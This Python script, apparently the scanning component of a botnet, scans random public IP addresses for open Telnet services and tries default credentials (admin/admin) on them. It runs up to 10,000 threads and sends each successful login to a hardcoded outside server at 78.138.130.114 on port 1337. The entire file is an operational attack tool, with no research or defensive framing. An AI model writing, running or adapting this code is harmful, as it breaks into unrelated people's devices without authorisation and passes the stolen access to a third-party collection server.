import socket
import random
import time
from colored import Fore, Style
from concurrent.futures import ThreadPoolExecutor
import telnetlib

class TelnetBot:
    cracked = 0
    
    username_password_list = [('admin', 'admin')]

    port = 23  # Default Telnet port
    ip_list = []
    max_threads = 10000
    server_ip = '78.138.130.114'
    server_port = 1337

    def __init__(self):
        self.server_connected = False

    def connect_to_server(self):
        while True:
            try:
                self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_sock.connect((self.server_ip, self.server_port))
                self.server_connected = True
                break
            except Exception:
                time.sleep(1)

    def send_to_server(self, message):
        if not self.server_connected:
            self.connect_to_server()

        try:
            self.server_sock.sendall(message.encode('utf-8'))
        except Exception:
            self.server_connected = False
            self.connect_to_server()

    def generate_ips(self, count):
        self.ip_list = []
        ip_first_octets = ["1", "2", "5", "7", "8", "11", "14", "15", "31", "37", "39", "41", "43", "49", "58", "59", "60", "61", "62", "64", "66", "70", "72", "77", "78", "79", "80", "82", "86", "89", "90", "91", "92", "93", "94", "95", "96", "97", "98", "100"]
        for _ in range(count):
            first_octet = random.choice(ip_first_octets)
            ip = f"{first_octet}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
            self.ip_list.append(ip)

    def check_port(self, ip, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False

    def telnet_connect(self, ip, user, password):
        try:
            tn = telnetlib.Telnet(ip, self.port, timeout=5)
            tn.read_until(b'login: ')
            tn.write(user.encode('utf-8') + b'\n')
            tn.read_until(b'Password: ')
            tn.write(password.encode('utf-8') + b'\n')
            # Check if login was successful (customize based on telnet server response)
            response = tn.read_some()
            tn.close()
            if b'Login incorrect' in response:  # Adjust according to server response
                return 1  # Authentication failed
            else:
                return 0  # Authentication successful
        except Exception:
            return 2  # Exception occurred during connection

    def run(self):
        while True:
            self.generate_ips(10000)
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                for ip in self.ip_list:
                    executor.submit(self.process_ip, ip)

    def process_ip(self, ip):
        if self.check_port(ip, self.port):
            self.main(ip)
        time.sleep(0.01)

    def main(self, ip):
        found = False
        for user, password in self.username_password_list:
            if found:
                break
            try:
                response = self.telnet_connect(ip, user, password)

                if response == 0:
                    success_message = f'\t{Fore.green}[*] {ip} [*] {user} [*] Pass: {password} => Login Correct *** <={Style.reset}'
                    print(success_message)
                    self.send_to_server(success_message)
                    self.cracked += 1
                    found = True
                elif response == 1:
                    print(f'\t{Fore.red}[-] {ip} [USER: {user}] [PASSWORD: {password}] => Login Incorrect.{Style.reset}')
            except Exception:
                pass

if __name__ == '__main__':
    try:
        b = TelnetBot()
        b.connect_to_server()
        b.run()
    except KeyboardInterrupt:
        pass
